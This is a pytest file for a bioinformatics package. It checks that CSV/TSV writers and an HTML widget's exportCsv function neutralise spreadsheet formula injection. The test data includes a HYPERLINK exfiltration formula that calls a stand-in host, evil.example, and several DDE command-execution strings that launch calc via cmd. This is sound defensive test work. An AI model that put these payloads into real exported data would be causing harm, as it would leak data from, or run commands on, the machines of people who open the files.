"""v9.7.410 CLAUDE_410_csv_writer_coverage — CSV/TSV formula-injection guard coverage.

Fail-before / pass-after on the .409 base (execution-confirmed in
development/round6_v409/WORKBOOK_EXPORT_AUDIT.md):

* .409 wired ``csv_safety.SafeDictWriter`` into 5 of 99 CSV-writing modules; the deliverable
  writers (``bgc_report_builder.write_tsv``, ``cell_provenance``, ``activity_lead_genes``,
  ``cohort_leads_ledger``, ``af_dossier``) used plain ``csv.DictWriter`` on antiSMASH-derived text,
  so ``=HYPERLINK(...)`` landed verbatim in the CSV.
* The HTML-widget ``exportCsv`` JavaScript only ``"``-quoted cells; Excel/LibreOffice strip CSV
  quotes on import and evaluate the cell.

After the patch both surfaces apply ONE documented rule (mamey/csv_safety.py): a string cell led by
``= + - @ TAB CR`` gets a ``'`` prefix, except a lone strand sign or a plain signed number, and
non-string cells are never touched.
"""
from __future__ import annotations

import csv
import io
import json
import re
import shutil
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

import mamey
from mamey import csv_safety
from mamey.csv_safety import SafeDictWriter, csv_safe_cell

# .409 has no positional-row analogue; resolve lazily so the fail-before run reports a test
# failure rather than a collection error.
SafeWriter = getattr(csv_safety, "SafeWriter", None)

pytestmark = pytest.mark.public

PAYLOAD = '=HYPERLINK("http://evil.example/"&A1,"x")'
DDE = "=cmd|' /C calc'!A0"
BUNDLE_ROOT = Path(mamey.__file__).resolve().parent.parent

# Raw external-tool result captures (byte-faithful, re-ingested by the BLASTp parser) and the
# numeric-only phase-timing table are the ONLY plain csv.writer / csv.DictWriter sites allowed.
PLAIN_WRITER_ALLOWLIST = {
    "mamey/csv_safety.py",
    "mamey/blastp_online.py",
    "mamey/blastp_ebi.py",
    "mamey/ebi_xml_to_outfmt10.py",
    "mamey/timing.py",
}
PLAIN_WRITER_RE = re.compile(r"\b(?:csv|_csv\w*)\.(?:DictWriter|writer)\(")


def _read_csv(path, delimiter=","):
    with open(path, newline="", encoding="utf-8") as fh:
        body = [ln for ln in fh.read().splitlines() if not ln.startswith("#")]
    return list(csv.DictReader(io.StringIO("\n".join(body)), delimiter=delimiter))


# ----------------------------------------------------------------------------- the rule itself

@pytest.mark.parametrize("value,expected", [
    (PAYLOAD, "'" + PAYLOAD),
    (DDE, "'" + DDE),
    ("+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"),
    ("@SUM(1+9)*cmd|' /C calc'!A0", "'@SUM(1+9)*cmd|' /C calc'!A0"),
    ("\t=1+1", "'\t=1+1"),
    ("\r=1+1", "'\r=1+1"),
    ("-2+3", "'-2+3"),                 # sign-led arithmetic IS a formula
    ("-", "-"),                        # lone strand sign: exempt
    ("+", "+"),
    ("-1.5", "-1.5"),                  # plain signed numbers: exempt (numeric round-trip)
    ("+3", "+3"),
    ("-2e-4", "-2e-4"),
    ("-.5", "-.5"),
    ("T1PKS; NRPS", "T1PKS; NRPS"),    # ordinary text: byte-identical
    ("0000", "0000"),
    ("", ""),
    (3, 3), (-3.5, -3.5), (None, None), (True, True),
])
def test_csv_safe_cell_rule(value, expected):
    assert csv_safe_cell(value) == expected


def test_safe_writer_positional_rows_and_numbers():
    assert SafeWriter is not None, "csv_safety.SafeWriter (csv.writer analogue) missing"
    buf = io.StringIO()
    w = SafeWriter(buf, delimiter="\t", lineterminator="\n")
    w.writerow(["bgc", "product", "strand", "score"])
    w.writerows([["BGC1", PAYLOAD, "-", -0.35], ["BGC2", "NRPS", "+", 12]])
    rows = list(csv.reader(io.StringIO(buf.getvalue()), delimiter="\t"))
    assert rows[1] == ["BGC1", "'" + PAYLOAD, "-", "-0.35"]
    assert rows[2] == ["BGC2", "NRPS", "+", "12"]
    assert w.dialect.delimiter == "\t"


def test_safe_dict_writer_writerows_and_header():
    buf = io.StringIO()
    w = SafeDictWriter(buf, fieldnames=["a", "n"], lineterminator="\n")
    w.writeheader()
    w.writerows([{"a": DDE, "n": -7}, {"a": "-", "n": "-1.5"}])
    assert buf.getvalue().splitlines() == ["a,n", f"'{DDE},-7", "-,-1.5"]


# ------------------------------------------------------- the five named deliverable writers

def test_bgc_report_builder_write_tsv_neutralises(tmp_path):
    from mamey.bgc_report_builder import write_tsv
    out = tmp_path / "report.tsv"
    write_tsv(out, [{"bgc_id": "BGC1", "products": PAYLOAD, "function": DDE, "score": -1.25,
                     "strand": "-"}], ["bgc_id", "products", "function", "score", "strand"])
    rows = _read_csv(out, "\t")
    assert rows[0]["products"] == "'" + PAYLOAD
    assert rows[0]["function"] == "'" + DDE
    assert rows[0]["score"] == "-1.25" and rows[0]["strand"] == "-"
    assert PAYLOAD not in out.read_text(encoding="utf-8").replace("'" + PAYLOAD, "")


def test_cell_provenance_raw_products_neutralised(tmp_path):
    from mamey.cell_provenance import write_cell_provenance
    run = SimpleNamespace(
        context=SimpleNamespace(strain_id="AS-TEST"),
        bgcs=[SimpleNamespace(bgc_id="BGC1", products=[PAYLOAD, "NRPS"], edge_status="Interior")],
    )
    csv_path, worklist_path, _md = write_cell_provenance(run, tmp_path)
    rows = {r["cell_or_field"]: r for r in _read_csv(csv_path)}
    assert rows["BGC1.products"]["current_value"] == "'" + PAYLOAD + "; NRPS"
    assert rows["BGC1.boundary"]["current_value"] == "Interior"
    assert worklist_path.exists()


def test_activity_lead_genes_write_csv_neutralises(tmp_path):
    from mamey.activity_lead_genes import _write_csv
    out = tmp_path / "ACTIVITY_LEAD_GENE_ANCHORS.csv"
    _write_csv(str(out), [{"locus_tag": PAYLOAD, "function": DDE, "af": "-0.5", "n": 4}],
               ["locus_tag", "function", "af", "n"])
    row = _read_csv(out)[0]
    assert row == {"locus_tag": "'" + PAYLOAD, "function": "'" + DDE, "af": "-0.5", "n": "4"}


def test_cohort_leads_ledger_write_ledger_neutralises(tmp_path):
    from mamey.cohort_leads_ledger import LEDGER_COLUMNS, write_ledger
    row = {c: "" for c in LEDGER_COLUMNS}
    text_cols = [c for c in LEDGER_COLUMNS if c.lower() in ("products", "kcb_top", "product", "bgc_id", "strain")] or LEDGER_COLUMNS[:1]
    for c in text_cols:
        row[c] = PAYLOAD
    row[LEDGER_COLUMNS[-1]] = "-0.75"
    meta = {"engine_versions": ["v9.7.409"], "mixed_engine": False, "n_leads": 1, "n_strains": 1}
    out = write_ledger([row], meta, str(tmp_path / "COHORT_PRIORITY_LEADS.csv"))
    got = _read_csv(out)[0]
    for c in text_cols:
        assert got[c] == "'" + PAYLOAD, c
    assert got[LEDGER_COLUMNS[-1]] == "-0.75"


def test_af_dossier_write_csv_neutralises(tmp_path):
    from mamey import af_dossier
    fields = list(af_dossier._CSV_FIELDS)
    row = {f: "" for f in fields}
    row[fields[0]] = PAYLOAD
    row[fields[1]] = DDE
    row[fields[-1]] = "-3"
    out = tmp_path / "AF_DOSSIER.csv"
    af_dossier._write_csv([row], out)
    got = _read_csv(out)[0]
    assert got[fields[0]] == "'" + PAYLOAD and got[fields[1]] == "'" + DDE
    assert got[fields[-1]] == "-3"


# ------------------------------------------------------------------- HTML widget exportCsv (JS)

def _rendered_common_js():
    from mamey.widget_deliverable import _COMMON_JS, _shell
    meta = {"strain_id": "AS-TEST", "release": "r", "taxonomy": "t", "source": "s", "workflow_version": "v"}
    page = _shell("Title", "<p>x</p>", {"meta": meta}, active="priority")
    assert _COMMON_JS in page
    return _COMMON_JS


def test_widget_export_csv_applies_the_csv_safety_rule():
    js = _rendered_common_js()
    export = re.search(r"function exportCsv\(rows,name\)\{.*?\n", js).group(0)
    # the leader-prefix step must sit INSIDE q(), before the quote-doubling
    assert re.search(r"const q=v=>'\"'\+csvSafeCell\(String\(v\?\?''\)\)\.replaceAll", export), export
    leader = re.search(r"const CSV_LEADER=/\^\[(.+?)\]/,", js).group(1)
    numeric = re.search(r"CSV_NUMERIC=/(.+?)/;", js).group(1)
    # identical rule: numeric-token regex is the csv_safety constant, leader class covers exactly
    # the csv_safety leaders (both patterns are valid Python re AND JavaScript RegExp syntax)
    assert numeric == csv_safety.CSV_NUMERIC_TOKEN
    py_leader = re.compile("^[" + leader + "]")
    for ch in csv_safety._CSV_INJECTION_LEADERS:
        assert py_leader.match(ch), repr(ch)
    for ch in ("T", "0", " ", "'", "N"):
        assert not py_leader.match(ch), repr(ch)
    assert "csvSafeCell" in js and "function csvSafeCell(s)" in js


@pytest.mark.skipif(shutil.which("node") is None, reason="node not installed; static equivalence test above still runs")
def test_widget_export_csv_in_a_js_engine(tmp_path):
    js = _rendered_common_js()
    funcs = "\n".join(ln for ln in js.splitlines()
                      if ln.startswith(("const CSV_LEADER", "function csvSafeCell", "function exportCsv")))
    harness = (
        "let out='';function saveBlob(b,n){out=b.parts.join('')}"
        "class Blob{constructor(p){this.parts=p}}\n" + funcs + "\n"
        "exportCsv(" + json.dumps([{"bgc_id": "BGC1", "products": PAYLOAD, "kcb_top": "@SUM(1)", "strand": "-", "af": -0.35, "n": 3}]) +
        ",'x.csv');console.log(out)"
    )
    script = tmp_path / "h.js"
    script.write_text(harness, encoding="utf-8")
    out = subprocess.run(["node", str(script)], capture_output=True, text=True, check=True).stdout
    row = list(csv.reader(io.StringIO(out)))[1]
    assert row == ["BGC1", "'" + PAYLOAD, "'@SUM(1)", "-", "-0.35", "3"]


# ------------------------------------------------------------------------------- coverage lock

def test_no_plain_csv_writer_outside_allowlist():
    # v9.7.410 (CLAUDE_v9.7.410_tools_csv_writer_coverage): `tools/` joined the lock — 72 operator
    # scripts (98 sites) wrote CSV/TSV with plain writers, a dozen of them from BLAST / antiSMASH
    # text (blastp_top_def, function_label, product). No tools/ entry is allowlisted.
    offenders = {}
    for sub in ("mamey", "deliverable_tools", "tools"):
        for py in sorted((BUNDLE_ROOT / sub).rglob("*.py")):
            rel = py.relative_to(BUNDLE_ROOT).as_posix()
            if rel in PLAIN_WRITER_ALLOWLIST:
                continue
            hits = PLAIN_WRITER_RE.findall(py.read_text(encoding="utf-8", errors="replace"))
            if hits:
                offenders[rel] = len(hits)
    assert not offenders, f"plain csv writers outside the allowlist: {offenders}"


def test_every_guarded_tool_binds_the_safe_writers_it_uses():
    """tools/ scripts are not importable as a package (many run top-level code), so this is a
    text-level check: any tools/*.py that calls a safe writer must carry the guarded import block
    with the bare-script sys.path fallback (bundle root is one level up from tools/)."""
    for py in sorted((BUNDLE_ROOT / "tools").rglob("*.py")):
        text = py.read_text(encoding="utf-8", errors="replace")
        used = [n for n in ("_SafeDictWriter(", "_SafeWriter(") if n in text]
        if not used:
            continue
        assert "from mamey.csv_safety import SafeDictWriter as _SafeDictWriter, SafeWriter as _SafeWriter" in text, py.name
        assert "_cs_sys.path.insert(0, _cs_os.path.dirname(_cs_os.path.dirname(" in text, \
            f"{py.name}: guard block lacks the bare-script bundle-root fallback"


def test_every_guarded_module_binds_both_safe_writers():
    import importlib
    for py in sorted((BUNDLE_ROOT / "mamey").rglob("*.py")):
        text = py.read_text(encoding="utf-8", errors="replace")
        if "csv_safety import" not in text or py.name == "csv_safety.py":
            continue
        mod = importlib.import_module(".".join(py.relative_to(BUNDLE_ROOT).with_suffix("").parts))
        for name in ("_SafeDictWriter", "_SafeWriter"):
            if name + "(" in text:
                assert getattr(mod, name, None) is not None, f"{py.name} uses {name} but never binds it"
